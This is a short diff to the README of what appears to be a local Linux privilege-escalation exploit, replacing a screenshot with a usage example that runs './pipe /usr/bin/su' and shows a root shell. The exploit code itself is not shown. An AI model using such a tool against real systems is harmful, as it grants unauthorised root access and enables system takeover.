@@ -27,4 +27,11 @@ While easier to exploit, it is similar to an older vulnerability disclosed in 20
 
 ### How to use
 
-![image](https://user-images.githubusercontent.com/57206134/159064377-23df736d-a613-4dc6-aea2-87f4476e06fc.png)
+```
+./pipe /usr/bin/su
+```
+
+``` 
+# whoami
+root
+``` 
